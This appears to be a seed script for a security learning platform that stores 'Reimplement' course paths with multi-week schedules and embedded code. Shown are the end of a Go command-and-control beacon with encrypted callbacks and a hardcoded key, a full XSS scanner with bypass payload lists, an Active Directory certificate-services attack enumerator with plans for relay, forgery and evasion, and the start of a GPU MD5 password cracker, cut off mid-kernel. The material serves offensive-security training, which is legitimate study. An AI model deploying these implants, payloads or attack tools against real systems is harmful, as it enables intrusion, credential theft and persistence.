    defer resp.Body.Close()

    body, _ := ioutil.ReadAll(resp.Body)
    return b.decrypt(body)
}

// Encryption

func (b *Beacon) encrypt(data []byte) []byte {
    block, _ := aes.NewCipher(b.config.AESKey)
    gcm, _ := cipher.NewGCM(block)

    nonce := make([]byte, gcm.NonceSize())
    io.ReadFull(rand.Reader, nonce)

    return gcm.Seal(nonce, nonce, data, nil)
}

func (b *Beacon) decrypt(data []byte) ([]byte, error) {
    if len(data) == 0 {
        return nil, nil
    }

    block, _ := aes.NewCipher(b.config.AESKey)
    gcm, _ := cipher.NewGCM(block)

    nonceSize := gcm.NonceSize()
    if len(data) < nonceSize {
        return nil, fmt.Errorf("ciphertext too short")
    }

    nonce, ciphertext := data[:nonceSize], data[nonceSize:]
    return gcm.Open(nil, nonce, ciphertext, nil)
}

// Helpers

func getHostname() string {
    name, _ := os.Hostname()
    return name
}

func getUsername() string {
    if runtime.GOOS == "windows" {
        return os.Getenv("USERNAME")
    }
    return os.Getenv("USER")
}

func isElevated() bool {
    if runtime.GOOS == "windows" {
        // Check for admin
        return false
    }
    return os.Getuid() == 0
}

func main() {
    mrand.Seed(time.Now().UnixNano())

    config := &BeaconConfig{
        TeamServer: "https://teamserver:443",
        UserAgent:  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        SleepTime:  60,
        Jitter:     20,
        AESKey:     []byte("0123456789abcdef0123456789abcdef"),
    }

    beacon := NewBeacon(config)
    beacon.Run()
}
\`\`\`
`, 0, now);

// ============================================================================
// XSSTRIKE
// ============================================================================
const xssSchedule = `## 3-Week Schedule

### Week 1: Detection Engine
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | Crawler | Discover forms and parameters |
| Day 2 | Reflection Detection | Find reflected input |
| Day 3 | Context Analysis | Detect HTML/JS/attribute context |
| Day 4 | WAF Detection | Identify WAF presence |
| Day 5 | Encoding Analysis | Test encoding handling |
| Weekend | Integration | Combine detection modules |

### Week 2: Payload Generation
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | Payload Database | Curated XSS payloads |
| Day 2 | Context-Aware | Generate context-specific payloads |
| Day 3 | Encoding Bypass | URL, HTML, Unicode encoding |
| Day 4 | Filter Bypass | Case, spacing, comments |
| Day 5 | Polyglot Generation | Universal payloads |
| Weekend | Testing | Test against XSS challenges |

### Week 3: Exploitation & Reporting
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | DOM XSS | JavaScript source/sink analysis |
| Day 2 | Stored XSS | Persistent XSS detection |
| Day 3 | Blind XSS | Out-of-band detection |
| Day 4 | Proof Generation | Screenshot, callback server |
| Day 5 | Reporting | HTML/JSON reports |
| Weekend | Polish | CLI, documentation |

### Daily Commitment
- **Minimum**: 2-3 hours
- **Ideal**: 4 hours`;

const xssPath = insertPath.run(
	'Reimplement: XSStrike (XSS Scanner)',
	'Build an advanced XSS detection tool like XSStrike. Context-aware fuzzing, WAF bypass, DOM analysis, and intelligent payload generation.',
	'yellow',
	'Python',
	'intermediate',
	3,
	'XSS, DOM analysis, WAF bypass, encoding, context detection',
	xssSchedule,
	now
);

const xssMod1 = insertModule.run(xssPath.lastInsertRowid, 'XSS Detection', 'Find XSS vulnerabilities', 0, now);

insertTask.run(xssMod1.lastInsertRowid, 'Build XSS Scanner', 'Detect Cross-Site Scripting vulnerabilities by analyzing HTML parsing contexts and injecting context-appropriate payloads that escape attribute values, JavaScript strings, HTML tags, or URL parameters based on reflection point analysis', `## XSS Scanner Implementation

\`\`\`python
#!/usr/bin/env python3
"""
XSStrike-style XSS Scanner
Context-aware XSS vulnerability detection
"""

import re
import html
import urllib.parse
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple
from enum import Enum
import requests
from bs4 import BeautifulSoup


class Context(Enum):
    HTML = "html"
    ATTRIBUTE = "attribute"
    SCRIPT = "script"
    URL = "url"
    STYLE = "style"
    COMMENT = "comment"


@dataclass
class Reflection:
    parameter: str
    context: Context
    position: int
    surrounding: str
    filters: List[str] = field(default_factory=list)


@dataclass
class XSSVulnerability:
    url: str
    parameter: str
    context: Context
    payload: str
    proof: str


class XSSScanner:
    """Context-aware XSS Scanner"""

    # Canary for reflection detection
    CANARY = "xss8372test"

    # Payloads by context
    PAYLOADS = {
        Context.HTML: [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<iframe src="javascript:alert(1)">',
            '<marquee onstart=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
        ],
        Context.ATTRIBUTE: [
            '" onmouseover="alert(1)',
            "' onmouseover='alert(1)",
            '" onfocus="alert(1)" autofocus="',
            "' onfocus='alert(1)' autofocus='",
            '" onclick="alert(1)',
            "javascript:alert(1)",
            '" onload="alert(1)',
        ],
        Context.SCRIPT: [
            "';alert(1)//",
            '";alert(1)//',
            "</script><script>alert(1)</script>",
            "'-alert(1)-'",
            '"-alert(1)-"',
            "\\';alert(1)//",
            "1;alert(1)",
        ],
        Context.URL: [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "vbscript:alert(1)",
        ],
    }

    # WAF bypass encodings
    ENCODINGS = {
        'url': lambda s: urllib.parse.quote(s),
        'double_url': lambda s: urllib.parse.quote(urllib.parse.quote(s)),
        'html': lambda s: ''.join(f'&#{ord(c)};' for c in s),
        'unicode': lambda s: ''.join(f'\\\\u{ord(c):04x}' for c in s),
        'hex': lambda s: ''.join(f'\\\\x{ord(c):02x}' for c in s),
    }

    # Filter bypass techniques
    BYPASS_TECHNIQUES = [
        ('case', lambda s: s.swapcase()),
        ('spaces', lambda s: s.replace(' ', '/')),
        ('tabs', lambda s: s.replace(' ', '\\t')),
        ('newlines', lambda s: s.replace(' ', '\\n')),
        ('null', lambda s: s.replace('<', '<\\x00')),
        ('concat', lambda s: s.replace('alert', 'al'+'ert')),
    ]

    def __init__(self):
        self.session = requests.Session()
        self.session.headers['User-Agent'] = 'Mozilla/5.0'

    def scan(self, url: str, params: Dict[str, str] = None) -> List[XSSVulnerability]:
        """Scan URL for XSS vulnerabilities"""

        vulnerabilities = []

        # Extract parameters if not provided
        if params is None:
            params = self._extract_params(url)

        if not params:
            print("[-] No parameters found")
            return vulnerabilities

        print(f"[*] Testing {len(params)} parameter(s)")

        for param, value in params.items():
            print(f"\\n[*] Testing parameter: {param}")

            # Find reflections
            reflections = self._find_reflections(url, param, value)

            if not reflections:
                print(f"    [-] No reflection found")
                continue

            print(f"    [+] Found {len(reflections)} reflection(s)")

            for reflection in reflections:
                print(f"    [*] Context: {reflection.context.value}")

                # Test payloads for this context
                vuln = self._test_payloads(url, param, value, reflection)

                if vuln:
                    vulnerabilities.append(vuln)
                    print(f"    [+] XSS FOUND! Payload: {vuln.payload[:50]}...")

        return vulnerabilities

    def _extract_params(self, url: str) -> Dict[str, str]:
        """Extract GET parameters from URL"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        return {k: v[0] for k, v in params.items()}

    def _find_reflections(self, url: str, param: str, value: str) -> List[Reflection]:
        """Find where input is reflected in response"""

        reflections = []

        # Inject canary
        test_url = self._inject_param(url, param, self.CANARY)
        response = self.session.get(test_url)

        if self.CANARY not in response.text:
            return reflections

        # Find all occurrences
        soup = BeautifulSoup(response.text, 'html.parser')

        # Check HTML context
        for i, match in enumerate(re.finditer(re.escape(self.CANARY), response.text)):
            context = self._determine_context(response.text, match.start())

            reflection = Reflection(
                parameter=param,
                context=context,
                position=match.start(),
                surrounding=response.text[max(0, match.start()-50):match.end()+50]
            )

            # Detect filters
            reflection.filters = self._detect_filters(url, param)

            reflections.append(reflection)

        return reflections

    def _determine_context(self, html: str, position: int) -> Context:
        """Determine the context of a reflection"""

        before = html[:position].lower()

        # Check if inside script tag
        last_script_open = before.rfind('<script')
        last_script_close = before.rfind('</script')
        if last_script_open > last_script_close:
            return Context.SCRIPT

        # Check if inside style tag
        last_style_open = before.rfind('<style')
        last_style_close = before.rfind('</style')
        if last_style_open > last_style_close:
            return Context.STYLE

        # Check if inside HTML comment
        last_comment_open = before.rfind('<!--')
        last_comment_close = before.rfind('-->')
        if last_comment_open > last_comment_close:
            return Context.COMMENT

        # Check if inside attribute
        last_tag_open = before.rfind('<')
        last_tag_close = before.rfind('>')
        if last_tag_open > last_tag_close:
            # Inside a tag
            tag_content = before[last_tag_open:]

            # Check for URL attributes
            if re.search(r'(href|src|action|data)\\s*=\\s*["\\'"]?$', tag_content, re.I):
                return Context.URL

            # Check for event handlers
            if re.search(r'on\\w+\\s*=\\s*["\\'"]?$', tag_content, re.I):
                return Context.SCRIPT

            # Check if in attribute value
            quotes = re.findall(r'["\\'"]', tag_content)
            if len(quotes) % 2 == 1:
                return Context.ATTRIBUTE

        return Context.HTML

    def _detect_filters(self, url: str, param: str) -> List[str]:
        """Detect what characters/strings are being filtered"""

        filters = []

        test_chars = {
            '<': 'angle_brackets',
            '>': 'angle_brackets',
            '"': 'double_quotes',
            "'": 'single_quotes',
            '(': 'parentheses',
            ')': 'parentheses',
            '/': 'slashes',
            'script': 'script_keyword',
            'onerror': 'event_handlers',
            'javascript': 'javascript_keyword',
        }

        for char, filter_name in test_chars.items():
            test_url = self._inject_param(url, param, f"test{char}test")
            response = self.session.get(test_url)

            if char not in response.text:
                if filter_name not in filters:
                    filters.append(filter_name)

        return filters

    def _test_payloads(self, url: str, param: str, value: str,
                       reflection: Reflection) -> Optional[XSSVulnerability]:
        """Test payloads for a specific context"""

        payloads = self.PAYLOADS.get(reflection.context, self.PAYLOADS[Context.HTML])

        for payload in payloads:
            # Try original payload
            if self._verify_xss(url, param, payload):
                return XSSVulnerability(
                    url=url,
                    parameter=param,
                    context=reflection.context,
                    payload=payload,
                    proof=self._generate_proof(url, param, payload)
                )

            # Try encoded versions if filters detected
            if reflection.filters:
                for encoding_name, encode_func in self.ENCODINGS.items():
                    encoded_payload = encode_func(payload)
                    if self._verify_xss(url, param, encoded_payload):
                        return XSSVulnerability(
                            url=url,
                            parameter=param,
                            context=reflection.context,
                            payload=encoded_payload,
                            proof=self._generate_proof(url, param, encoded_payload)
                        )

                # Try bypass techniques
                for bypass_name, bypass_func in self.BYPASS_TECHNIQUES:
                    bypassed_payload = bypass_func(payload)
                    if self._verify_xss(url, param, bypassed_payload):
                        return XSSVulnerability(
                            url=url,
                            parameter=param,
                            context=reflection.context,
                            payload=bypassed_payload,
                            proof=self._generate_proof(url, param, bypassed_payload)
                        )

        return None

    def _verify_xss(self, url: str, param: str, payload: str) -> bool:
        """Verify if XSS payload executes"""

        test_url = self._inject_param(url, param, payload)
        response = self.session.get(test_url)

        # Check if payload is reflected unencoded
        if payload in response.text:
            # Check if it's actually executable (not sanitized)
            soup = BeautifulSoup(response.text, 'html.parser')

            # Look for our script/event handler
            scripts = soup.find_all('script')
            for script in scripts:
                if 'alert' in str(script):
                    return True

            # Look for event handlers
            for tag in soup.find_all(True):
                for attr in tag.attrs:
                    if attr.startswith('on') and 'alert' in str(tag.attrs[attr]):
                        return True

            # Check for img/svg with onerror
            dangerous_tags = soup.find_all(['img', 'svg', 'body', 'iframe'])
            for tag in dangerous_tags:
                for attr in ['onerror', 'onload', 'src']:
                    if attr in tag.attrs and 'alert' in str(tag.attrs.get(attr, '')):
                        return True

        return False

    def _inject_param(self, url: str, param: str, value: str) -> str:
        """Inject value into URL parameter"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        params[param] = [value]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return parsed._replace(query=new_query).geturl()

    def _generate_proof(self, url: str, param: str, payload: str) -> str:
        """Generate proof of concept URL"""
        return self._inject_param(url, param, payload)


def main():
    import argparse

    parser = argparse.ArgumentParser(description='XSS Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-p', '--param', help='Specific parameter to test')
    parser.add_argument('--crawl', action='store_true', help='Crawl for forms')

    args = parser.parse_args()

    scanner = XSSScanner()

    params = None
    if args.param:
        params = {args.param: 'test'}

    vulns = scanner.scan(args.url, params)

    print(f"\\n[*] Scan complete. Found {len(vulns)} vulnerability(ies)")

    for vuln in vulns:
        print(f"\\n  Parameter: {vuln.parameter}")
        print(f"  Context: {vuln.context.value}")
        print(f"  Payload: {vuln.payload}")
        print(f"  Proof: {vuln.proof}")


if __name__ == '__main__':
    main()
\`\`\`
`, 0, now);

// ============================================================================
// CERTIFY / CERTIPY
// ============================================================================
const certifySchedule = `## 4-Week Schedule

### Week 1: AD CS Enumeration
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | LDAP Queries | Find certificate authorities |
| Day 2 | Template Enumeration | List certificate templates |
| Day 3 | Permission Analysis | Check template permissions |
| Day 4 | ESC Detection | Identify ESC1-ESC8 vulnerabilities |
| Day 5 | Vulnerable CAs | Find misconfigured CAs |
| Weekend | Reporting | Generate enumeration report |

### Week 2: Certificate Attacks
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | ESC1 | Subject alternative name abuse |
| Day 2 | ESC2 | Any purpose EKU abuse |
| Day 3 | ESC3 | Enrollment agent abuse |
| Day 4 | ESC4 | Template ACL abuse |
| Day 5 | ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 |
| Weekend | Integration | Chain attacks together |

### Week 3: Relay & Coercion
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | ESC8 | HTTP enrollment relay |
| Day 2 | Certificate Relay | Relay to AD CS web enrollment |
| Day 3 | PetitPotam Chain | Coercion to relay to AD CS |
| Day 4 | Shadow Credentials | Certificate-based persistence |
| Day 5 | Golden Certificate | Forge any certificate |
| Weekend | Testing | Full attack chain testing |

### Week 4: Post-Exploitation
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | PKINIT | Authenticate with certificate |
| Day 2 | Certificate Theft | Export user certificates |
| Day 3 | Persistence | Certificate-based backdoors |
| Day 4 | Defense Evasion | Avoid detection |
| Day 5 | Documentation | Usage guide, examples |
| Weekend | Release | Package tool |

### Daily Commitment
- **Minimum**: 2-3 hours
- **Ideal**: 4 hours`;

const certifyPath = insertPath.run(
	'Reimplement: Certipy (AD CS Attacks)',
	'Build an AD Certificate Services attack tool like Certipy. Enumerate vulnerable templates, exploit ESC1-ESC8, relay attacks, and certificate theft.',
	'red',
	'Python',
	'advanced',
	4,
	'AD CS, certificates, PKINIT, ESC vulnerabilities, relay attacks',
	certifySchedule,
	now
);

const certMod1 = insertModule.run(certifyPath.lastInsertRowid, 'AD CS Enumeration', 'Find vulnerable certificate templates', 0, now);

insertTask.run(certMod1.lastInsertRowid, 'Build AD CS Enumerator', 'Query Active Directory for certificate templates, enrollment permissions, and CA configurations to identify ESC1-ESC8 vulnerabilities that allow privilege escalation through certificate abuse in AD CS environments', `## AD CS Enumeration

\`\`\`python
#!/usr/bin/env python3
"""
Certipy-style AD CS Attack Tool
Enumerate and exploit AD Certificate Services
"""

import ldap3
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Set
from enum import Enum
import struct


class ESCVulnerability(Enum):
    ESC1 = "ESC1: SAN Abuse"
    ESC2 = "ESC2: Any Purpose EKU"
    ESC3 = "ESC3: Enrollment Agent"
    ESC4 = "ESC4: Template ACL Abuse"
    ESC5 = "ESC5: PKI Object ACL Abuse"
    ESC6 = "ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2"
    ESC7 = "ESC7: CA ACL Abuse"
    ESC8 = "ESC8: HTTP Web Enrollment"


@dataclass
class CertificateTemplate:
    name: str
    display_name: str
    oid: str
    schema_version: int
    validity_period: str
    renewal_period: str
    enrollment_flag: int
    certificate_name_flag: int
    private_key_flag: int
    extended_key_usage: List[str]
    application_policies: List[str]
    authorized_signatures: int
    ra_application_policies: List[str]
    issuance_policies: List[str]
    security_descriptor: bytes
    vulnerabilities: List[ESCVulnerability] = field(default_factory=list)


@dataclass
class CertificateAuthority:
    name: str
    dns_name: str
    ca_certificate: bytes
    certificate_templates: List[str]
    enrollment_endpoints: List[str]
    vulnerabilities: List[ESCVulnerability] = field(default_factory=list)


class ADCSEnumerator:
    """Enumerate AD Certificate Services"""

    # EKU OIDs
    EKU_CLIENT_AUTH = "1.3.6.1.5.5.7.3.2"
    EKU_SMART_CARD_LOGON = "1.3.6.1.4.1.311.20.2.2"
    EKU_ANY_PURPOSE = "2.5.29.37.0"
    EKU_CERTIFICATE_REQUEST_AGENT = "1.3.6.1.4.1.311.20.2.1"

    # Certificate Name Flags
    CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x00000001
    CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME = 0x00010000

    # Enrollment Flags
    CT_FLAG_PEND_ALL_REQUESTS = 0x00000002
    CT_FLAG_NO_SECURITY_EXTENSION = 0x00080000

    def __init__(self, domain: str, dc_ip: str, username: str, password: str):
        self.domain = domain
        self.dc_ip = dc_ip
        self.username = username
        self.password = password
        self.conn = None
        self.base_dn = ','.join([f"DC={x}" for x in domain.split('.')])

    def connect(self):
        """Connect to LDAP"""
        server = ldap3.Server(self.dc_ip, get_info=ldap3.ALL)
        self.conn = ldap3.Connection(
            server,
            user=f"{self.domain}\\\\{self.username}",
            password=self.password,
            authentication=ldap3.NTLM
        )
        if not self.conn.bind():
            raise Exception(f"LDAP bind failed: {self.conn.result}")

    def find_certificate_authorities(self) -> List[CertificateAuthority]:
        """Find all Certificate Authorities"""

        cas = []

        # Search for enrollment services
        config_dn = f"CN=Configuration,{self.base_dn}"
        search_base = f"CN=Enrollment Services,CN=Public Key Services,CN=Services,{config_dn}"

        self.conn.search(
            search_base,
            '(objectClass=pKIEnrollmentService)',
            attributes=['cn', 'dNSHostName', 'cACertificate', 'certificateTemplates']
        )

        for entry in self.conn.entries:
            ca = CertificateAuthority(
                name=str(entry.cn),
                dns_name=str(entry.dNSHostName) if entry.dNSHostName else '',
                ca_certificate=bytes(entry.cACertificate) if entry.cACertificate else b'',
                certificate_templates=list(entry.certificateTemplates) if entry.certificateTemplates else [],
                enrollment_endpoints=[]
            )

            # Check for web enrollment (ESC8)
            ca.enrollment_endpoints = self._find_enrollment_endpoints(ca)
            if ca.enrollment_endpoints:
                ca.vulnerabilities.append(ESCVulnerability.ESC8)

            cas.append(ca)

        return cas

    def find_certificate_templates(self) -> List[CertificateTemplate]:
        """Find all certificate templates"""

        templates = []

        config_dn = f"CN=Configuration,{self.base_dn}"
        search_base = f"CN=Certificate Templates,CN=Public Key Services,CN=Services,{config_dn}"

        self.conn.search(
            search_base,
            '(objectClass=pKICertificateTemplate)',
            attributes=[
                'cn', 'displayName', 'msPKI-Cert-Template-OID',
                'revision', 'pKIExpirationPeriod', 'pKIOverlapPeriod',
                'msPKI-Enrollment-Flag', 'msPKI-Certificate-Name-Flag',
                'msPKI-Private-Key-Flag', 'pKIExtendedKeyUsage',
                'msPKI-Certificate-Application-Policy',
                'msPKI-RA-Signature', 'msPKI-RA-Application-Policies',
                'msPKI-Certificate-Policy', 'nTSecurityDescriptor'
            ]
        )

        for entry in self.conn.entries:
            template = CertificateTemplate(
                name=str(entry.cn),
                display_name=str(entry.displayName) if entry.displayName else '',
                oid=str(entry['msPKI-Cert-Template-OID']) if entry['msPKI-Cert-Template-OID'] else '',
                schema_version=int(entry.revision) if entry.revision else 1,
                validity_period=self._parse_interval(entry.pKIExpirationPeriod),
                renewal_period=self._parse_interval(entry.pKIOverlapPeriod),
                enrollment_flag=int(entry['msPKI-Enrollment-Flag']) if entry['msPKI-Enrollment-Flag'] else 0,
                certificate_name_flag=int(entry['msPKI-Certificate-Name-Flag']) if entry['msPKI-Certificate-Name-Flag'] else 0,
                private_key_flag=int(entry['msPKI-Private-Key-Flag']) if entry['msPKI-Private-Key-Flag'] else 0,
                extended_key_usage=list(entry.pKIExtendedKeyUsage) if entry.pKIExtendedKeyUsage else [],
                application_policies=list(entry['msPKI-Certificate-Application-Policy']) if entry['msPKI-Certificate-Application-Policy'] else [],
                authorized_signatures=int(entry['msPKI-RA-Signature']) if entry['msPKI-RA-Signature'] else 0,
                ra_application_policies=list(entry['msPKI-RA-Application-Policies']) if entry['msPKI-RA-Application-Policies'] else [],
                issuance_policies=list(entry['msPKI-Certificate-Policy']) if entry['msPKI-Certificate-Policy'] else [],
                security_descriptor=bytes(entry.nTSecurityDescriptor) if entry.nTSecurityDescriptor else b''
            )

            # Check for vulnerabilities
            template.vulnerabilities = self._check_vulnerabilities(template)
            templates.append(template)

        return templates

    def _check_vulnerabilities(self, template: CertificateTemplate) -> List[ESCVulnerability]:
        """Check template for ESC vulnerabilities"""

        vulns = []

        # ESC1: SAN Abuse
        # - Client auth EKU
        # - CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT or CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME
        # - Manager approval not required
        # - No authorized signatures required
        has_client_auth = (
            self.EKU_CLIENT_AUTH in template.extended_key_usage or
            self.EKU_SMART_CARD_LOGON in template.extended_key_usage or
            self.EKU_ANY_PURPOSE in template.extended_key_usage or
            not template.extended_key_usage  # No EKU = any purpose
        )

        supplies_subject = (
            template.certificate_name_flag & self.CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT or
            template.certificate_name_flag & self.CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME
        )

        manager_approval_required = template.enrollment_flag & self.CT_FLAG_PEND_ALL_REQUESTS

        if has_client_auth and supplies_subject and not manager_approval_required:
            if template.authorized_signatures == 0:
                vulns.append(ESCVulnerability.ESC1)

        # ESC2: Any Purpose EKU
        if self.EKU_ANY_PURPOSE in template.extended_key_usage:
            if not manager_approval_required and template.authorized_signatures == 0:
                vulns.append(ESCVulnerability.ESC2)

        # ESC3: Enrollment Agent
        if self.EKU_CERTIFICATE_REQUEST_AGENT in template.extended_key_usage:
            if not manager_approval_required and template.authorized_signatures == 0:
                vulns.append(ESCVulnerability.ESC3)

        # ESC4: Template ACL abuse would require parsing nTSecurityDescriptor

        return vulns

    def _find_enrollment_endpoints(self, ca: CertificateAuthority) -> List[str]:
        """Find web enrollment endpoints"""

        endpoints = []

        if ca.dns_name:
            # Common AD CS web enrollment paths
            paths = [
                f"http://{ca.dns_name}/certsrv/",
                f"https://{ca.dns_name}/certsrv/",
                f"http://{ca.dns_name}/certsrv/certfnsh.asp",
            ]

            import requests
            for path in paths:
                try:
                    resp = requests.get(path, timeout=5, verify=False)
                    if resp.status_code in [200, 401]:
                        endpoints.append(path)
                except:
                    pass

        return endpoints

    def _parse_interval(self, value) -> str:
        """Parse AD interval format"""
        if not value:
            return ""

        try:
            raw = bytes(value)
            interval = struct.unpack('<q', raw)[0]
            # Convert 100ns intervals to days
            days = abs(interval) / (10000000 * 60 * 60 * 24)
            return f"{int(days)} days"
        except:
            return ""

    def print_report(self, cas: List[CertificateAuthority],
                     templates: List[CertificateTemplate]):
        """Print enumeration report"""

        print("\\n" + "="*60)
        print("AD CS ENUMERATION REPORT")
        print("="*60)

        print(f"\\n[*] Found {len(cas)} Certificate Authority(ies)")
        for ca in cas:
            print(f"\\n  CA: {ca.name}")
            print(f"  DNS: {ca.dns_name}")
            print(f"  Templates: {len(ca.certificate_templates)}")
            if ca.enrollment_endpoints:
                print(f"  Web Enrollment: {', '.join(ca.enrollment_endpoints)}")
            if ca.vulnerabilities:
                print(f"  VULNERABLE: {', '.join(v.value for v in ca.vulnerabilities)}")

        print(f"\\n[*] Found {len(templates)} Certificate Template(s)")

        vulnerable_templates = [t for t in templates if t.vulnerabilities]
        print(f"[!] {len(vulnerable_templates)} Vulnerable Template(s)")

        for template in vulnerable_templates:
            print(f"\\n  Template: {template.name}")
            print(f"  Display Name: {template.display_name}")
            print(f"  EKUs: {', '.join(template.extended_key_usage) or 'Any Purpose'}")
            print(f"  Vulnerabilities:")
            for vuln in template.vulnerabilities:
                print(f"    - {vuln.value}")


def main():
    import argparse

    parser = argparse.ArgumentParser(description='AD CS Enumerator')
    parser.add_argument('-d', '--domain', required=True)
    parser.add_argument('-dc', '--dc-ip', required=True)
    parser.add_argument('-u', '--username', required=True)
    parser.add_argument('-p', '--password', required=True)

    args = parser.parse_args()

    enumerator = ADCSEnumerator(args.domain, args.dc_ip, args.username, args.password)
    enumerator.connect()

    print("[*] Enumerating Certificate Authorities...")
    cas = enumerator.find_certificate_authorities()

    print("[*] Enumerating Certificate Templates...")
    templates = enumerator.find_certificate_templates()

    enumerator.print_report(cas, templates)


if __name__ == '__main__':
    main()
\`\`\`
`, 0, now);

// ============================================================================
// HASHCAT GPU
// ============================================================================
const hashcatGPUSchedule = `## 6-Week Schedule

### Week 1: Hash Algorithms
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | MD5 Implementation | Pure MD5 in C |
| Day 2 | SHA1/SHA256 | SHA family implementations |
| Day 3 | NTLM | NT hash (MD4 of UTF-16LE) |
| Day 4 | bcrypt | bcrypt implementation |
| Day 5 | scrypt | Memory-hard function |
| Weekend | Testing | Verify against hashcat |

### Week 2: GPU Basics (OpenCL/CUDA)
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | OpenCL Setup | Initialize OpenCL context |
| Day 2 | Kernel Writing | Basic OpenCL kernels |
| Day 3 | Memory Management | Device memory allocation |
| Day 4 | Parallel Hashing | Batch hash computation |
| Day 5 | Benchmarking | Measure performance |
| Weekend | Optimization | Optimize memory access |

### Week 3: Attack Modes
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | Dictionary Attack | Wordlist processing on GPU |
| Day 2 | Brute Force | Charset iteration |
| Day 3 | Rule Engine | GPU rule processing |
| Day 4 | Mask Attack | Pattern-based generation |
| Day 5 | Combinator | Word combinations |
| Weekend | Hybrid | Combine attack modes |

### Week 4: Advanced Rules
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | Rule Parser | Parse hashcat rules |
| Day 2 | Rule Functions | Implement all rule functions |
| Day 3 | Rule Chaining | Multiple rules per candidate |
| Day 4 | Rule Generation | Automatic rule creation |
| Day 5 | Best64 | Implement best64.rule |
| Weekend | Performance | Optimize rule engine |

### Week 5: Hash Types
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | NTLMv2 | NetNTLMv2 cracking |
| Day 2 | Kerberos | krb5tgs, krb5asrep |
| Day 3 | WPA/WPA2 | 4-way handshake |
| Day 4 | Office | MS Office documents |
| Day 5 | Archives | ZIP, RAR, 7z |
| Weekend | Web | bcrypt, Drupal, WordPress |

### Week 6: CLI & Polish
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | CLI Interface | hashcat-compatible options |
| Day 2 | Session Management | Save/restore sessions |
| Day 3 | Performance Tuning | Auto-tune workload |
| Day 4 | Potfile | Cracked hash storage |
| Day 5 | Output Formats | Various output modes |
| Weekend | Documentation | Usage guide |

### Daily Commitment
- **Minimum**: 3 hours
- **Ideal**: 5 hours`;

const hashcatGPUPath = insertPath.run(
	'Reimplement: Hashcat (GPU Cracking)',
	'Build a GPU-accelerated password cracker like Hashcat. OpenCL/CUDA kernels, multiple attack modes, rule engine, and support for 100+ hash types.',
	'red',
	'C+OpenCL',
	'expert',
	6,
	'GPU computing, OpenCL, CUDA, cryptography, hash algorithms, parallel processing',
	hashcatGPUSchedule,
	now
);

const hashcatMod1 = insertModule.run(hashcatGPUPath.lastInsertRowid, 'GPU Hash Cracking', 'OpenCL-based password cracking', 0, now);

insertTask.run(hashcatMod1.lastInsertRowid, 'Build OpenCL MD5 Cracker', 'Implement GPU-accelerated password cracking using OpenCL kernels for parallel MD5 computation, supporting dictionary attacks with wordlist streaming, candidate batching, and multi-device workload distribution', `## OpenCL MD5 Cracker

### OpenCL Kernel

\`\`\`c
// md5_kernel.cl - OpenCL MD5 Hash Cracker

#define F(x, y, z) (((x) & (y)) | ((~x) & (z)))
#define G(x, y, z) (((x) & (z)) | ((y) & (~z)))
#define H(x, y, z) ((x) ^ (y) ^ (z))
#define I(x, y, z) ((y) ^ ((x) | (~z)))

#define ROTATE_LEFT(x, n) (((x) << (n)) | ((x) >> (32-(n))))

#define FF(a, b, c, d, x, s, ac) { \\
    (a) += F((b), (c), (d)) + (x) + (ac); \\
    (a) = ROTATE_LEFT((a), (s)); \\
    (a) += (b); \\
}

#define GG(a, b, c, d, x, s, ac) { \\
    (a) += G((b), (c), (d)) + (x) + (ac); \\
    (a) = ROTATE_LEFT((a), (s)); \\
    (a) += (b); \\
}

#define HH(a, b, c, d, x, s, ac) { \\
    (a) += H((b), (c), (d)) + (x) + (ac); \\
    (a) = ROTATE_LEFT((a), (s)); \\
    (a) += (b); \\
}

#define II(a, b, c, d, x, s, ac) { \\
    (a) += I((b), (c), (d)) + (x) + (ac); \\
    (a) = ROTATE_LEFT((a), (s)); \\
    (a) += (b); \\
}

// MD5 initialization constants
#define MD5_A 0x67452301
#define MD5_B 0xefcdab89
#define MD5_C 0x98badcfe
#define MD5_D 0x10325476

void md5_transform(__private uint *state, __private const uchar *block) {
    uint a = state[0], b = state[1], c = state[2], d = state[3];
    uint x[16];

    // Decode block into 16 32-bit words
    for (int i = 0; i < 16; i++) {
        x[i] = ((uint)block[i*4]) |
               ((uint)block[i*4+1] << 8) |
               ((uint)block[i*4+2] << 16) |
               ((uint)block[i*4+3] << 24);
    }

    // Round 1
    FF(a, b, c, d, x[ 0],  7, 0xd76aa478);
    FF(d, a, b, c, x[ 1], 12, 0xe8c7b756);
    FF(c, d, a, b, x[ 2], 17, 0x242070db);
    FF(b, c, d, a, x[ 3], 22, 0xc1bdceee);
    FF(a, b, c, d, x[ 4],  7, 0xf57c0faf);
